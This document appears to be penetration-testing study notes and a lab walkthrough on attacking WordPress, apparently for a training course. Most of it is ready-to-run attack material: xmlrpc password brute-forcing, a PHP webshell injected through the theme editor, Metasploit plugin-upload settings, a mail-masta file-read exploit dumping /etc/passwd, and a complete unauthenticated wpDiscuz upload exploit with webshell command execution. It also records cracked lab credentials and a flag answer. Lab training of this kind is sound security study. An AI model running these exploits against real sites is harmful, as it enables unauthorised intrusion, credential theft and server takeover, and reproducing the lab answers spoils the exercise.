# Section 4 — Attacking WordPress

Three reliable WordPress attack paths:

```
1. Login brute-force (xmlrpc preferred)  → admin creds
2. Authenticated → theme/plugin editor   → PHP RCE
3. Plugin CVE exploitation               → often unauth RCE
```

In the lab, attack 1+2 fail due to a hardened theme editor — but attack 3 (wpDiscuz 7.0.4 unauth file upload) succeeds. The lesson: keep multiple paths warm.

---

## 1 — Login Brute Force

### Two endpoints
| Endpoint | Speed | Notes |
|----------|-------|-------|
| `/wp-login.php` | Slow | Tracked, sometimes rate-limited |
| `/xmlrpc.php` (system.multicall) | **Fast** | No CAPTCHA, batch multiple guesses per request |

### WPScan brute force
```bash
wpscan --url http://target \
       --password-attack xmlrpc \
       -t 20 \
       -U doug \
       -P /usr/share/wordlists/rockyou.txt
```
> Brute-forces a known user's password via the xmlrpc endpoint; swap `target`, the `-U` user, and the wordlist.

### Recognizing usernames first
- `/?author=N` → 200 with `<title>` containing user display name; 404 if no user
- `/wp-json/wp/v2/users` → JSON list of post authors (visible only if user has published posts)
- Login error message: `"The username X is not registered"` vs `"The password for X is incorrect"`

```bash
# Author scan body inspection
curl -sk "http://target/?author=2" | grep -oE 'author-[a-z0-9]+|title>[^<]+'
# author-doug
# title>Doug Douglas …
```
> Reveals a username from the `?author=N` page body (author CSS class / title); swap `target` and the author ID.

---

## 2 — Theme Editor RCE (When It Works)

### Steps
1. Log in as admin
2. **Appearance → Theme Editor**
3. Select an **inactive** theme (don't break the active one)
4. Choose `404.php` (rarely triggered, less noisy than `index.php`)
5. Append `<?php system($_GET[0]); ?>` (or anywhere outside conflicting PHP blocks)
6. Click **Update File**
7. Trigger: `curl http://target/wp-content/themes/THEME/404.php?0=id`

### When the editor refuses

The theme editor can return **"There was an error while trying to update the file"** for several reasons:

| Cause | Check |
|-------|-------|
| `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php` | Editor link removed entirely (won't even appear in menu) |
| `define('DISALLOW_FILE_MODS', true);` | Both plugin and theme editors disabled |
| Theme files not writable by `www-data` | `ls -la /var/www/.../wp-content/themes/THEME/` |
| Security plugin (Wordfence, iThemes) intercepting | Look for plugin in `?p=N` HTML |
| Lab uses a different list of themes | Re-fetch the editor; `<select name="theme">` lists what's available |

**In the lab**, twentynineteen was the section's example but only twentytwenty/twentytwentyone/business-gravity/transport-gravity exist — and ALL theme edits are blocked (including benign content). Fallback: malicious plugin upload or unauth plugin CVE.

---

## 3 — Metasploit `wp_admin_shell_upload`

When theme edit is blocked but admin creds work, Metasploit can upload a malicious plugin instead:
```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set username doug
set password jessica1
set rhost target
set vhost blog.inlanefreight.local
set lhost tun0
exploit
```
> Uploads a malicious plugin via valid admin creds for RCE; swap username, password, rhost, vhost, and lhost.

Cleanup is automatic but **always verify** — list it as an artifact in your report regardless.

---

## 4 — Vulnerable Plugin: mail-masta (CVE-2016-1000127)

LFI via the `pl` parameter in `count_of_send.php` — **unauthenticated**.

```bash
curl -sk "http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
> Exploits the mail-masta LFI to read an arbitrary file (CVE-2016-1000127); swap `target` and the `pl=` path.

Reads any file the web user can read. Combined with `/etc/passwd` shell parsing, identifies real-user accounts:
```bash
curl -sk "http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" | grep "/bin/bash"
# root:x:0:0:root:/root:/bin/bash
# ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
# webadmin:x:1001:1001::/home/webadmin:/bin/bash   ← non-default user
```
> Uses the LFI to dump `/etc/passwd` and filter shell users for valid accounts; swap `target` for the host.

Also vulnerable to SQL injection in the same plugin.

---

## 5 — Vulnerable Plugin: wpDiscuz 7.0.4 (CVE-2020-24186)

**Unauthenticated file upload bypass** → arbitrary PHP → RCE.

The plugin only intended to allow image attachments. Mime type detection can be bypassed by:
- Setting `Content-Type: image/jpeg` on the multipart part
- Prefixing the body with the GIF magic header (`GIF89a`)
- Using a PHP extension on the filename

### Manual exploit

**Step 1 — get wmu_nonce from a post page:**
```bash
curl -sk "http://target/?p=1" | grep -oE 'wmuSecurity":"[a-f0-9]+"'
# wmuSecurity":"6651bf63da"
```
> Scrapes the wpDiscuz `wmuSecurity` nonce needed for the unauth upload; swap `target` and the post ID.

**Step 2 — POST the malicious upload:**
```bash
NONCE=6651bf63da
BOUNDARY="----WebKitFormBoundaryXXX"

cat > /tmp/wpd_payload << EOF
--$BOUNDARY
Content-Disposition: form-data; name="action"

wmuUploadFiles
--$BOUNDARY
Content-Disposition: form-data; name="wmu_nonce"

$NONCE
--$BOUNDARY
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
--$BOUNDARY
Content-Disposition: form-data; name="wmu_files[0]"; filename="shell.php"
Content-Type: image/jpeg

GIF89a
<?php if(isset(\$_REQUEST['cmd'])){ system(\$_REQUEST['cmd']); die; } ?>
--$BOUNDARY
Content-Disposition: form-data; name="postId"

1
--$BOUNDARY--
EOF

# wmuUploadFiles requires CRLF line endings in multipart body
perl -pi -e 's/\n/\r\n/g' /tmp/wpd_payload

curl -sk -X POST -H "X-Requested-With: XMLHttpRequest" \
     -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
     --data-binary @/tmp/wpd_payload \
     "http://target/wp-admin/admin-ajax.php"
```
> Builds and POSTs the wpDiscuz multipart payload to upload a PHP webshell (CVE-2020-24186); swap `NONCE` and `target`.

**Step 3 — extract uploaded URL from JSON response:**
```json
{"success":true,"data":{"previewsData":{"images":[{"url":"http:\/\/target\/wp-content\/uploads\/2026\/05\/shell-1778774745.5047.php"}]}}}
```

**Step 4 — execute commands:**
```bash
SHELL="http://target/wp-content/uploads/2026/05/shell-1778774745.5047.php"
curl -sk "$SHELL?cmd=id"
# GIF89a
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
> Executes commands through the uploaded webshell via the `cmd` parameter; swap the `SHELL` URL and command.

The `GIF89a` echoes back because it's still in the file. Strip with `grep -v GIF` if scripting.

### Cleanup
```bash
curl -sk "$SHELL?cmd=rm%20\$(echo%20$SHELL%20|%20sed%20's|.*wp-content|/var/www/blog.inlanefreight.local/wp-content|')"
# Or fetch full path with realpath and rm explicitly
```
> Deletes the uploaded shell via itself to clean up; swap the `SHELL` URL and webroot path.

---

## Lab Walkthrough (`blog.inlanefreight.local`)

### Q1 — User besides admin
```bash
curl -sk "http://blog.inlanefreight.local/?author=2" | grep -oE 'author-[a-z0-9]+'
# author-doug
```
> Enumerates a second username from the `?author=2` page; swap the host and author ID.
**Answer:** `doug`

### Q2 — Doug's password (brute force)
```bash
wpscan --password-attack xmlrpc -t 20 \
       -U doug \
       -P /usr/share/wordlists/rockyou.txt \
       --url http://blog.inlanefreight.local
# [SUCCESS] - doug / jessica1
```
> Cracks doug's password via xmlrpc brute force; swap the `-U` user, wordlist, and `--url` host.
**Answer:** `jessica1`

Took ~22 seconds. xmlrpc multicall lets WPScan batch ~5 guesses per request.

### Q3 — Another /bin/bash system user (via mail-masta LFI)
```bash
curl -sk "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" | grep "/bin/bash"
# root:x:0:0:root:/root:/bin/bash
# ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
# webadmin:x:1001:1001::/home/webadmin:/bin/bash
```
> Reads `/etc/passwd` via the mail-masta LFI to find shell users; swap the host and `pl=` path.
**Answer:** `webadmin`

### Q4 — Flag in webroot

The theme editor approach **fails** on this lab (returns "error while trying to update the file" for any edit). Drop to wpDiscuz 7.0.4 unauth upload instead:

```bash
URL="http://blog.inlanefreight.local"

# 1. Get nonce
NONCE=$(curl -sk "$URL/?p=1" | grep -oE 'wmuSecurity":"[a-f0-9]+"' | head -1 | cut -d'"' -f3)

# 2. Build + send multipart payload (see exploit above)
# ... POST to /wp-admin/admin-ajax.php ...

# 3. Got: /wp-content/uploads/2026/05/shell-1778774745.5047.php
SHELL="$URL/wp-content/uploads/2026/05/shell-1778774745.5047.php"

# 4. Find flag in webroot
curl -sk "$SHELL?cmd=ls%20-la%20/var/www/blog.inlanefreight.local/" | grep flag
# -rw-r--r-- 1 root root 20 Sep 21 2021 flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt

curl -sk "$SHELL?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
```
> Full wpDiscuz unauth-upload chain: grab nonce, POST shell, then read the webroot flag; swap `URL` and the flag path.
**Answer:** `l00k_ma_unAuth_rc3!`

Note the **vhost-based webroot**: `/var/www/blog.inlanefreight.local/` (not `/var/www/html/`). Each vhost has its own webroot in this lab setup.

### Cleanup
```bash
curl -sk "$SHELL?cmd=rm%20/var/www/blog.inlanefreight.local/wp-content/uploads/2026/05/shell-1778774745.5047.php"
curl -sk -o /dev/null -w "%{http_code}\n" "$SHELL"   # 404 confirms deletion
```
> Removes the uploaded shell and verifies a 404; swap the `SHELL` URL and absolute file path.

Add to report appendix: *"Uploaded `shell-1778774745.5047.php` via wpDiscuz CVE-2020-24186; removed after exploitation. Verified 404."*

---

## When the Theme Editor Fails — Path Forward Cheatsheet

```
Editor blocked
    ↓
Try Metasploit wp_admin_shell_upload (uploads plugin)
    ↓
Still blocked
    ↓
Search plugin list for known CVEs:
    - wpDiscuz 7.0.4   → unauth RCE      ← used here
    - mail-masta 1.0   → unauth LFI/SQLi
    - File Manager ≤6.8 → unauth RCE
    - Duplicator ≤1.4.6 → unauth file read
    ↓
No vulnerable plugin?
    ↓
Try authenticated CVEs from your foothold's role
    ↓
Try password reuse against SSH/other services
```

---

## Cleanup Checklist (Report Appendix)

For every WP attack, the report appendix should list:
- **Exploited systems:** `blog.inlanefreight.local` via wpDiscuz 7.0.4 CVE-2020-24186
- **Compromised users:** `doug` (xmlrpc brute force, password `jessica1`)
- **Artifacts created:** `/var/www/blog.../wp-content/uploads/2026/05/shell-*.php` — DELETED (verified)
- **Changes:** none (read-only after upload; no DB writes)

---

## Exam Notes

- `--password-attack xmlrpc` is the WPScan brute-force speed-up — almost always preferred
- The lab's user is `doug` (not `john` as in the module text) — always re-enumerate against the live instance
- mail-masta LFI: `wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=...` is the standard payload — memorize the path
- wpDiscuz 7.0.4 CVE-2020-24186 = unauth multipart upload of PHP via `wmuUploadFiles` action; `wmuSecurity` nonce is in the post page HTML
- GIF89a magic header bypasses mime type checks while staying valid PHP (PHP only requires `<?php` somewhere in the file)
- When theme editor returns "error while trying to update the file" — DON'T waste time; pivot to plugin upload or plugin CVE
- Vhost-based labs have webroots per-host: `/var/www/<vhost>/...`, NOT `/var/www/html/`
- Always remove uploaded shells AND list them in the report — failure to clean up is a finding against YOU
